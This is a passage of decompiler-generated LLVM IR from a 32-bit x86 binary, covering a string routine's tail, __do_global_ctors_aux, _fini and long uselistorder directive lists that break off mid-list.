  %v1_8068361 = phi i32 [ 0, %entry ], [ %v2_8068345, %dec_label_pc_806834d ], [ %v1_806836114, %dec_label_pc_8068351 ], [ %v2_8068345, %dec_label_pc_8068329 ]
  %tmp33 = icmp slt i32 %arg3, 1
  br i1 %tmp33, label %dec_label_pc_806836a, label %dec_label_pc_806835d

dec_label_pc_806835d:                             ; preds = %dec_label_pc_8068356
  %v2_8068361 = add i32 %v1_8068361, %arg2
  %v3_8068361 = inttoptr i32 %v2_8068361 to i8*
  store i8 0, i8* %v3_8068361, align 1
  %v0_8068365 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8068365 = add i32 %v0_8068365, 1
  br label %dec_label_pc_806836d

dec_label_pc_806836a:                             ; preds = %dec_label_pc_806831e, %dec_label_pc_806831a, %dec_label_pc_8068356
  br label %dec_label_pc_806836d

dec_label_pc_806836d:                             ; preds = %dec_label_pc_806835d, %dec_label_pc_806836a
  %storemerge4 = phi i32 [ %v1_8068365, %dec_label_pc_806835d ], [ -1, %dec_label_pc_806836a ]
  store i32 %v0_80682e6, i32* @esi, align 4
  store i32 %v0_80682e5, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8068351, { 1, 0 }
  uselistorder i32 %v1_806834a, { 0, 2, 1 }
  uselistorder i32 %v5_80682f8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i8 0, { 91, 92, 93, 1, 2, 106, 107, 111, 112, 114, 121, 119, 120, 4, 117, 118, 116, 5, 130, 131, 132, 133, 134, 135, 60, 61, 62, 136, 6, 137, 138, 7, 140, 139, 8, 122, 141, 142, 113, 143, 201, 202, 10, 76, 75, 9, 77, 78, 12, 96, 95, 11, 97, 13, 223, 98, 123, 124, 126, 125, 145, 146, 147, 3, 148, 149, 150, 151, 127, 128, 129, 224, 108, 109, 152, 94, 103, 99, 100, 101, 102, 14, 104, 105, 80, 29, 39, 27, 28, 110, 30, 63, 81, 85, 226, 207, 208, 209, 210, 211, 212, 213, 214, 31, 215, 188, 32, 16, 82, 83, 15, 153, 154, 40, 191, 192, 0, 193, 194, 195, 155, 144, 196, 115, 197, 156, 157, 158, 159, 160, 161, 162, 163, 164, 17, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 23, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 58, 225, 79, 227, 64, 18, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 25, 84, 86, 87, 88, 89, 90, 189, 190, 198, 199, 200, 19, 203, 204, 26, 205, 24, 206, 216, 221, 220, 20, 217, 218, 22, 219, 21, 222, 59, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 (i8*, i32, i32)* @memcpy, { 9, 10, 11, 12, 15, 16, 17, 18, 0, 1, 23, 13, 14, 19, 20, 2, 3, 21, 22, 4, 5, 6, 7, 8 }
  uselistorder i32 (i8*)* @strlen, { 15, 13, 12, 11, 10, 9, 27, 26, 14, 8, 7, 6, 28, 25, 24, 23, 21, 22, 20, 19, 18, 31, 30, 29, 17, 16, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 7, 11, 12, 13, 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 14, 15 }
  uselistorder i32 46, { 1, 6, 2, 5, 0, 3, 4 }
  uselistorder i8* null, { 1, 3, 5, 2, 4, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 31, 28, 29, 30, 25, 26, 27, 22, 23, 24, 19, 20, 21, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* @esi, { 149, 150, 151, 33, 152, 153, 4, 154, 155, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 5, 188, 191, 192, 193, 194, 195, 196, 197, 198, 199, 202, 203, 204, 205, 206, 207, 208, 209, 228, 229, 230, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 268, 269, 270, 271, 272, 6, 273, 274, 8, 7, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 275, 10, 276, 277, 9, 278, 279, 280, 281, 67, 68, 282, 283, 284, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 210, 211, 212, 69, 70, 413, 414, 417, 418, 419, 420, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 285, 286, 287, 288, 291, 292, 293, 294, 295, 296, 121, 122, 123, 124, 125, 156, 157, 158, 11, 159, 160, 189, 190, 231, 241, 12, 3, 242, 235, 236, 237, 238, 239, 240, 232, 233, 234, 243, 244, 297, 298, 299, 13, 300, 301, 302, 303, 304, 305, 306, 245, 246, 247, 14, 248, 15, 249, 16, 250, 251, 252, 253, 200, 201, 161, 162, 82, 83, 17, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 129, 130, 131, 132, 421, 422, 423, 424, 133, 18, 134, 135, 137, 138, 35, 136, 19, 430, 445, 431, 432, 435, 436, 146, 147, 34, 148, 425, 426, 20, 36, 37, 38, 386, 52, 21, 53, 22, 427, 428, 429, 102, 103, 104, 105, 106, 107, 139, 140, 141, 0, 142, 143, 144, 108, 109, 110, 111, 387, 392, 23, 393, 394, 388, 389, 390, 391, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 24, 405, 25, 406, 407, 408, 409, 126, 26, 127, 128, 410, 27, 411, 412, 376, 28, 377, 378, 265, 29, 266, 267, 371, 372, 373, 374, 375, 437, 440, 307, 308, 309, 310, 289, 290, 384, 385, 415, 416, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 31, 324, 325, 1, 326, 327, 328, 329, 30, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 32, 348, 349, 350, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 54, 55, 56, 351, 2, 352, 353, 370, 441, 442, 443, 444, 379, 380, 381, 382, 383, 112, 113, 114, 438, 439, 433, 434, 115, 116, 117, 118, 119, 120, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 145, 446 }
  uselistorder i32* @edi, { 78, 11, 79, 80, 81, 10, 82, 83, 84, 104, 105, 106, 107, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 148, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 28, 2, 29, 30, 31, 32, 172, 0, 173, 174, 175, 3, 176, 177, 178, 34, 35, 36, 37, 137, 138, 139, 267, 268, 140, 141, 142, 143, 144, 145, 146, 147, 108, 109, 110, 179, 180, 181, 182, 183, 184, 185, 62, 63, 64, 65, 4, 149, 152, 150, 151, 186, 187, 188, 5, 189, 190, 191, 192, 153, 154, 155, 156, 6, 157, 158, 159, 136, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 38, 39, 40, 41, 42, 43, 44, 45, 66, 67, 269, 68, 283, 284, 14, 15, 46, 47, 48, 49, 50, 51, 52, 69, 70, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 7, 263, 264, 229, 230, 231, 232, 233, 270, 271, 272, 273, 274, 275, 276, 281, 282, 193, 265, 266, 194, 195, 196, 197, 198, 199, 200, 201, 12, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 1, 8, 16, 212, 9, 213, 214, 234, 235, 236, 237, 238, 53, 54, 55, 277, 278, 279, 280, 56, 57, 58, 59, 60, 61, 13, 71, 72, 73, 74, 75, 76, 77, 239, 240, 241, 242 }
  uselistorder label %dec_label_pc_806836d, { 1, 0 }
  uselistorder label %dec_label_pc_806836a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8068356, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8068351, { 1, 0 }
  uselistorder label %dec_label_pc_806831a, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp7, i32* %stack_var_-12, align 4
  %v0_8068387 = load i32, i32* @global_var_80717f0.1652, align 16
  %v10_806838c = icmp eq i32 %v0_8068387, -1
  br i1 %v10_806838c, label %dec_label_pc_80683a3, label %dec_label_pc_8068391

dec_label_pc_8068391:                             ; preds = %entry
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8068393

dec_label_pc_8068393:                             ; preds = %dec_label_pc_8068393, %dec_label_pc_8068391
  %v4_8068393 = phi i32 [ %v3_8068395, %dec_label_pc_8068393 ], [ %v0_8068387, %dec_label_pc_8068391 ]
  call void @__pseudo_call(i32 %v4_8068393)
  %v0_8068395 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8068395 = add i32 %v0_8068395, ptrtoint (i32* @global_var_80717ec.1734 to i32)
  %v2_8068395 = inttoptr i32 %v1_8068395 to i32*
  %v3_8068395 = load i32, i32* %v2_8068395, align 4
  %v1_806839b = add i32 %v0_8068395, -4
  store i32 %v1_806839b, i32* %ebx.global-to-local, align 4
  %v10_806839e = icmp eq i32 %v3_8068395, -1
  %v1_80683a1 = icmp eq i1 %v10_806839e, false
  br i1 %v1_80683a1, label %dec_label_pc_8068393, label %dec_label_pc_80683a3.loopexit

dec_label_pc_80683a3.loopexit:                    ; preds = %dec_label_pc_8068393
  %v2_80683a6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80683a3

dec_label_pc_80683a3:                             ; preds = %dec_label_pc_80683a3.loopexit, %entry
  %v0_80683a8 = phi i32 [ %v3_8068395, %dec_label_pc_80683a3.loopexit ], [ %v0_8068387, %entry ]
  %v2_80683a6 = phi i32 [ %v2_80683a6.pre, %dec_label_pc_80683a3.loopexit ], [ %tmp7, %entry ]
  store i32 %v2_80683a6, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80683a8

; uselistorder directives
  uselistorder i32 %v3_8068395, { 1, 0, 2 }
  uselistorder i32 %v0_8068387, { 1, 2, 0 }
  uselistorder i1 false, { 841, 442, 441, 443, 448, 446, 444, 445, 447, 470, 473, 474, 475, 476, 477, 479, 480, 481, 482, 483, 484, 69, 485, 486, 487, 488, 523, 506, 507, 508, 70, 519, 562, 576, 577, 522, 578, 579, 580, 581, 582, 583, 584, 585, 586, 588, 589, 590, 0, 592, 593, 594, 591, 1, 154, 156, 157, 158, 159, 155, 160, 161, 163, 62, 162, 63, 11, 595, 596, 45, 597, 12, 600, 598, 599, 9, 10, 13, 601, 602, 607, 606, 603, 604, 605, 14, 2, 524, 525, 526, 608, 609, 610, 527, 46, 528, 611, 612, 613, 614, 615, 616, 617, 164, 3, 167, 842, 843, 847, 848, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 471, 472, 618, 619, 621, 620, 623, 624, 625, 626, 627, 766, 768, 767, 15, 16, 239, 240, 241, 242, 17, 449, 451, 450, 18, 628, 629, 630, 849, 850, 452, 478, 556, 529, 555, 19, 47, 552, 553, 554, 543, 539, 540, 541, 542, 544, 545, 546, 547, 548, 549, 550, 551, 530, 531, 532, 533, 535, 534, 71, 536, 537, 538, 557, 558, 559, 560, 561, 453, 454, 455, 456, 457, 4, 631, 95, 632, 633, 634, 635, 636, 637, 96, 97, 638, 92, 639, 640, 641, 98, 642, 99, 93, 643, 644, 645, 5, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 6, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 851, 852, 853, 857, 64, 72, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 8, 665, 664, 73, 666, 667, 458, 459, 460, 461, 462, 463, 464, 465, 466, 100, 467, 468, 469, 65, 48, 165, 166, 168, 170, 169, 171, 844, 845, 846, 269, 172, 270, 286, 271, 272, 273, 274, 275, 66, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 860, 861, 862, 863, 873, 884, 885, 886, 887, 895, 74, 896, 897, 894, 883, 867, 888, 889, 864, 865, 866, 771, 772, 773, 854, 855, 856, 880, 881, 882, 779, 780, 781, 287, 288, 289, 290, 49, 874, 198, 50, 199, 173, 174, 175, 176, 427, 94, 75, 428, 429, 430, 77, 431, 76, 432, 433, 434, 435, 436, 78, 782, 783, 858, 859, 120, 123, 121, 122, 20, 124, 125, 145, 146, 150, 147, 148, 149, 868, 869, 101, 500, 501, 502, 503, 504, 505, 102, 177, 7, 291, 21, 300, 301, 178, 876, 877, 878, 879, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 790, 803, 804, 805, 806, 807, 808, 809, 810, 811, 43, 813, 812, 22, 818, 814, 815, 816, 817, 819, 820, 179, 776, 255, 821, 747, 587, 745, 890, 24, 294, 293, 23, 668, 669, 79, 755, 757, 756, 26, 759, 758, 25, 760, 670, 622, 761, 520, 521, 762, 822, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 693, 51, 692, 694, 695, 696, 697, 698, 700, 44, 701, 699, 702, 705, 703, 704, 27, 706, 707, 709, 708, 80, 710, 711, 712, 713, 714, 103, 715, 716, 112, 717, 113, 114, 104, 115, 718, 719, 720, 721, 722, 105, 116, 117, 723, 724, 725, 726, 727, 728, 106, 729, 107, 118, 108, 730, 109, 731, 732, 733, 110, 734, 111, 735, 119, 736, 737, 738, 151, 152, 739, 740, 741, 742, 743, 744, 870, 82, 872, 871, 81, 892, 893, 748, 891, 875, 190, 180, 83, 181, 28, 182, 183, 184, 29, 185, 186, 187, 188, 189, 191, 193, 192, 31, 30, 194, 195, 196, 197, 200, 201, 202, 204, 203, 87, 52, 205, 206, 207, 208, 210, 209, 86, 53, 211, 212, 214, 213, 85, 215, 216, 218, 217, 84, 54, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 243, 249, 244, 245, 246, 247, 248, 88, 250, 251, 252, 253, 254, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 292, 295, 55, 296, 297, 298, 33, 299, 32, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 56, 417, 418, 419, 420, 421, 68, 422, 423, 424, 425, 426, 437, 438, 439, 440, 746, 749, 91, 750, 57, 751, 58, 752, 754, 753, 34, 764, 763, 35, 765, 36, 769, 770, 774, 37, 775, 67, 777, 778, 784, 785, 786, 59, 787, 788, 789, 838, 823, 824, 825, 826, 831, 835, 836, 837, 38, 827, 89, 828, 829, 830, 60, 42, 832, 41, 61, 40, 833, 834, 39, 839, 840, 153, 90, 898, 899, 900 }
  uselistorder i32 -4, { 14, 64, 15, 65, 16, 17, 18, 19, 20, 21, 70, 1, 0, 71, 72, 22, 23, 24, 25, 26, 73, 74, 27, 28, 29, 30, 66, 10, 67, 68, 69, 12, 6, 7, 8, 9, 63, 75, 31, 32, 11, 2, 76, 77, 33, 34, 35, 36, 37, 38, 39, 3, 40, 93, 62, 97, 41, 42, 57, 58, 59, 94, 82, 83, 84, 4, 85, 86, 81, 87, 88, 89, 90, 91, 92, 13, 95, 96, 78, 79, 80, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 61, 5, 56 }
  uselistorder void (i32)* @__pseudo_call, { 7, 4, 9, 10, 11, 12, 8, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 -1, { 0, 1, 156, 168, 298, 81, 169, 82, 83, 84, 170, 85, 3, 86, 2, 301, 302, 304, 306, 307, 5, 308, 171, 309, 53, 310, 172, 4, 311, 71, 6, 60, 7, 152, 287, 173, 8, 9, 10, 89, 88, 87, 174, 141, 142, 65, 64, 63, 175, 176, 90, 177, 291, 61, 157, 91, 178, 179, 180, 181, 182, 92, 93, 183, 57, 58, 184, 94, 185, 186, 331, 165, 332, 333, 334, 70, 11, 187, 314, 189, 188, 77, 190, 191, 295, 296, 299, 300, 192, 66, 95, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 75, 207, 315, 208, 149, 99, 100, 209, 101, 210, 158, 211, 96, 212, 76, 213, 316, 151, 98, 97, 214, 215, 216, 103, 102, 217, 317, 62, 218, 219, 220, 221, 222, 104, 223, 224, 225, 226, 159, 303, 72, 227, 105, 106, 297, 228, 229, 12, 230, 231, 13, 107, 288, 14, 108, 109, 110, 111, 112, 113, 15, 232, 233, 78, 114, 16, 115, 234, 235, 236, 237, 238, 239, 240, 241, 242, 17, 18, 243, 80, 335, 292, 116, 244, 245, 246, 247, 117, 248, 249, 119, 118, 120, 250, 121, 251, 122, 252, 67, 253, 254, 19, 255, 328, 22, 21, 23, 24, 25, 160, 26, 27, 20, 329, 54, 256, 257, 258, 29, 123, 28, 30, 124, 323, 336, 337, 318, 324, 259, 260, 319, 261, 312, 313, 68, 325, 326, 305, 79, 327, 262, 330, 125, 73, 263, 264, 320, 321, 59, 265, 266, 322, 127, 126, 267, 268, 269, 166, 167, 270, 271, 272, 55, 150, 128, 129, 130, 131, 132, 133, 134, 273, 135, 136, 137, 138, 139, 274, 140, 31, 289, 290, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 275, 44, 45, 74, 46, 47, 69, 56, 48, 49, 294, 293, 276, 161, 277, 278, 50, 279, 154, 155, 153, 51, 143, 144, 145, 146, 147, 148, 52, 280, 281, 282, 283, 284, 285, 286, 162, 163, 164 }
  uselistorder i32 1, { 489, 302, 880, 333, 881, 882, 197, 198, 883, 884, 334, 335, 885, 402, 0, 902, 490, 173, 174, 903, 491, 303, 304, 904, 492, 306, 305, 905, 906, 309, 307, 308, 907, 493, 310, 495, 494, 497, 496, 265, 266, 498, 908, 501, 500, 499, 909, 910, 911, 1, 403, 409, 912, 913, 2, 504, 503, 502, 470, 222, 221, 220, 223, 914, 915, 916, 926, 927, 928, 336, 337, 507, 506, 505, 268, 267, 269, 270, 935, 508, 271, 272, 934, 509, 273, 340, 961, 962, 963, 3, 964, 965, 966, 338, 967, 326, 339, 968, 969, 341, 970, 971, 972, 973, 974, 975, 976, 510, 158, 155, 156, 154, 157, 795, 977, 978, 323, 511, 245, 243, 244, 809, 810, 811, 812, 813, 814, 815, 816, 817, 514, 513, 512, 471, 195, 194, 196, 818, 819, 517, 516, 515, 472, 120, 117, 118, 119, 116, 115, 378, 979, 980, 319, 324, 981, 982, 342, 983, 320, 984, 985, 519, 518, 165, 167, 164, 166, 439, 986, 987, 988, 989, 521, 520, 60, 59, 62, 61, 63, 58, 522, 139, 936, 523, 182, 343, 524, 131, 133, 130, 132, 129, 344, 525, 148, 147, 4, 990, 526, 249, 991, 246, 247, 527, 150, 151, 149, 529, 528, 226, 224, 225, 227, 531, 530, 230, 228, 229, 231, 532, 534, 533, 108, 107, 379, 1126, 1127, 440, 441, 536, 535, 185, 186, 820, 410, 380, 929, 930, 931, 932, 538, 537, 275, 274, 276, 411, 539, 152, 153, 992, 993, 404, 996, 5, 541, 540, 208, 210, 207, 209, 211, 381, 382, 1064, 1065, 1066, 1067, 327, 839, 840, 841, 542, 199, 886, 887, 888, 889, 890, 543, 277, 278, 1128, 891, 544, 937, 945, 946, 345, 168, 383, 938, 473, 169, 942, 943, 252, 253, 6, 944, 7, 939, 940, 251, 346, 8, 941, 250, 9, 947, 948, 279, 892, 893, 255, 894, 895, 280, 281, 413, 997, 998, 999, 347, 412, 1000, 545, 1001, 1002, 348, 10, 1003, 1004, 557, 556, 555, 554, 553, 552, 551, 550, 549, 548, 547, 546, 289, 291, 282, 284, 285, 288, 286, 290, 283, 287, 1005, 1006, 11, 159, 163, 161, 160, 162, 558, 292, 293, 559, 206, 205, 325, 1007, 1008, 561, 560, 57, 54, 55, 56, 949, 12, 950, 951, 952, 13, 953, 954, 955, 956, 957, 958, 959, 960, 103, 1129, 1130, 1131, 124, 126, 127, 125, 128, 123, 562, 917, 14, 918, 919, 15, 920, 254, 921, 65, 64, 1009, 563, 102, 99, 101, 98, 100, 384, 385, 566, 565, 564, 567, 239, 568, 896, 897, 898, 899, 900, 901, 349, 569, 75, 74, 72, 73, 414, 350, 571, 570, 16, 572, 573, 76, 575, 574, 294, 415, 576, 577, 579, 578, 238, 580, 581, 582, 50, 583, 134, 135, 585, 584, 586, 261, 17, 590, 589, 588, 481, 587, 18, 592, 591, 850, 260, 593, 851, 594, 234, 235, 248, 19, 136, 1137, 1138, 1139, 1140, 598, 597, 596, 595, 213, 216, 214, 217, 212, 215, 1141, 386, 600, 599, 602, 601, 295, 604, 603, 40, 41, 605, 192, 193, 20, 608, 607, 606, 351, 609, 352, 296, 821, 822, 263, 264, 262, 21, 610, 138, 137, 259, 258, 871, 872, 256, 257, 873, 874, 875, 611, 109, 297, 612, 613, 299, 298, 387, 442, 388, 796, 794, 615, 482, 614, 443, 797, 808, 616, 1132, 618, 617, 53, 51, 52, 416, 619, 922, 923, 924, 925, 621, 620, 145, 144, 146, 143, 389, 622, 71, 69, 66, 68, 70, 67, 121, 122, 852, 798, 853, 444, 854, 624, 474, 623, 80, 77, 81, 78, 79, 625, 86, 82, 83, 84, 88, 87, 85, 417, 627, 626, 418, 628, 390, 629, 419, 632, 631, 630, 445, 634, 633, 300, 301, 420, 1078, 1079, 1080, 635, 37, 38, 39, 1081, 1082, 1083, 1084, 1085, 89, 93, 90, 91, 92, 446, 1077, 353, 314, 315, 316, 317, 422, 1086, 1087, 1088, 1089, 1090, 421, 1091, 1092, 1093, 1094, 1095, 1096, 392, 1097, 1098, 318, 393, 1099, 1100, 1101, 1102, 1103, 391, 447, 1104, 1105, 1106, 1107, 1108, 1109, 637, 636, 43, 44, 42, 46, 45, 394, 395, 638, 396, 397, 354, 641, 640, 639, 355, 448, 642, 643, 644, 645, 646, 647, 648, 649, 650, 1043, 1044, 651, 242, 1142, 1143, 654, 653, 652, 95, 96, 94, 97, 655, 857, 858, 859, 1010, 1011, 656, 483, 232, 233, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1012, 1013, 994, 995, 657, 106, 105, 104, 1059, 1060, 659, 658, 142, 141, 140, 406, 933, 1061, 1110, 661, 660, 170, 171, 172, 663, 662, 664, 1014, 1015, 799, 405, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 357, 1025, 1026, 449, 356, 1027, 358, 1028, 1029, 1030, 669, 668, 667, 666, 665, 178, 181, 175, 176, 177, 179, 180, 1031, 670, 110, 111, 113, 112, 114, 359, 671, 1032, 1033, 672, 190, 191, 1034, 1035, 800, 801, 398, 1036, 399, 1037, 1038, 360, 1039, 423, 1040, 675, 674, 673, 201, 203, 202, 200, 204, 361, 424, 22, 425, 676, 1041, 1042, 48, 49, 47, 677, 35, 36, 1133, 1134, 1135, 1136, 678, 312, 313, 311, 23, 450, 24, 680, 679, 681, 184, 682, 683, 685, 684, 686, 687, 689, 688, 690, 236, 237, 187, 823, 328, 429, 332, 824, 825, 826, 321, 452, 466, 827, 828, 829, 426, 830, 831, 832, 400, 362, 451, 427, 453, 695, 487, 694, 693, 692, 691, 475, 833, 834, 701, 700, 699, 698, 476, 697, 696, 835, 836, 703, 702, 837, 838, 363, 364, 365, 366, 704, 484, 842, 843, 844, 25, 454, 705, 485, 709, 708, 707, 706, 218, 219, 845, 26, 455, 710, 846, 847, 486, 714, 713, 712, 711, 240, 241, 848, 718, 717, 716, 715, 849, 456, 720, 719, 457, 721, 725, 724, 723, 722, 726, 730, 729, 728, 727, 855, 803, 27, 804, 805, 806, 807, 856, 735, 734, 733, 732, 731, 477, 188, 189, 322, 860, 861, 736, 737, 367, 862, 863, 740, 739, 738, 741, 433, 802, 742, 864, 743, 745, 744, 368, 28, 747, 746, 29, 30, 370, 865, 458, 369, 401, 866, 867, 749, 748, 434, 868, 869, 750, 459, 430, 431, 870, 751, 478, 876, 877, 752, 432, 460, 371, 878, 879, 760, 759, 758, 757, 756, 755, 754, 753, 407, 408, 1045, 1046, 31, 461, 1047, 372, 373, 1048, 1049, 763, 762, 761, 479, 1050, 765, 764, 1051, 767, 766, 462, 1062, 769, 768, 1063, 770, 435, 1068, 1069, 436, 1070, 1071, 437, 438, 1072, 1073, 771, 1074, 32, 1075, 463, 464, 775, 774, 773, 772, 465, 33, 374, 1076, 777, 776, 780, 779, 778, 783, 782, 781, 785, 784, 1111, 1112, 467, 1120, 1121, 331, 1122, 787, 786, 428, 34, 789, 788, 375, 1113, 330, 1114, 1115, 376, 1116, 329, 1118, 1119, 377, 468, 469, 1117, 480, 1123, 1124, 790, 1125, 1144, 183, 792, 791, 793, 488 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_80683af = load i32, i32* @ebx, align 4
  %v1_80683b0 = call i32 @__get_pc_thunk_bx(i32 %v0_80683af)
  store i32 %v1_80683b0, i32* @eax, align 4
  %v0_80683bb = call i32 @__do_global_dtors_aux()
  ret i32 %v0_80683bb

; uselistorder directives
  uselistorder i32* @eax, { 22, 135, 137, 138, 139, 141, 140, 142, 27, 143, 144, 30, 31, 32, 148, 33, 34, 149, 35, 36, 37, 38, 152, 40, 41, 164, 151, 150, 165, 166, 42, 167, 168, 169, 170, 171, 172, 43, 173, 178, 174, 175, 176, 177, 179, 180, 181, 182, 44, 183, 45, 46, 184, 185, 47, 48, 187, 188, 189, 49, 50, 190, 191, 57, 58, 60, 23, 59, 192, 194, 193, 153, 195, 51, 0, 52, 241, 243, 61, 242, 196, 197, 198, 39, 154, 155, 156, 157, 158, 7, 159, 136, 160, 161, 162, 163, 245, 145, 146, 147, 28, 29, 62, 64, 63, 115, 116, 118, 117, 246, 119, 120, 121, 248, 122, 123, 124, 129, 9, 125, 24, 126, 17, 127, 6, 25, 128, 250, 18, 259, 260, 265, 54, 268, 1, 262, 264, 266, 251, 10, 218, 11, 244, 12, 261, 13, 222, 14, 65, 26, 133, 8, 19, 134, 247, 249, 20, 231, 55, 21, 258, 66, 233, 232, 234, 236, 235, 111, 237, 208, 186, 2, 3, 4, 199, 201, 200, 202, 203, 205, 56, 204, 206, 15, 53, 252, 253, 254, 255, 256, 257, 209, 210, 211, 267, 263, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 114, 130, 131, 132, 207, 212, 213, 214, 215, 216, 217, 219, 220, 221, 223, 224, 225, 226, 227, 228, 229, 230, 238, 269, 239, 240, 5, 16 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 890, 129, 149, 1295, 1293, 1294, 891, 1296, 150, 261, 262, 1301, 1297, 1298, 1299, 86, 1300, 892, 1348, 1349, 871, 1363, 1364, 1365, 1366, 1367, 1368, 128, 139, 1369, 1370, 1371, 1373, 1374, 1376, 1375, 151, 1377, 893, 1378, 1379, 1380, 235, 152, 1381, 278, 1382, 1383, 1384, 1385, 894, 1386, 1387, 1388, 353, 354, 1389, 1390, 1391, 1392, 153, 367, 1393, 1394, 236, 1395, 154, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1446, 1429, 1430, 279, 1431, 1432, 1433, 1434, 1435, 237, 1436, 1437, 1438, 1444, 1495, 1522, 155, 1523, 368, 369, 1524, 1445, 1525, 1526, 1527, 1528, 1529, 1530, 1554, 1555, 1556, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1557, 1558, 1569, 1570, 1571, 1559, 1560, 1561, 1562, 1563, 1564, 1566, 1565, 1567, 1568, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 879, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 156, 895, 1600, 1601, 1602, 1603, 1604, 280, 1605, 1608, 1609, 125, 89, 90, 1606, 1607, 30, 87, 88, 896, 1610, 157, 158, 897, 1052, 898, 1053, 1054, 92, 899, 1055, 1056, 1057, 880, 1058, 91, 900, 159, 901, 370, 902, 160, 903, 904, 1059, 93, 77, 371, 905, 906, 161, 907, 908, 31, 1611, 373, 374, 162, 372, 909, 375, 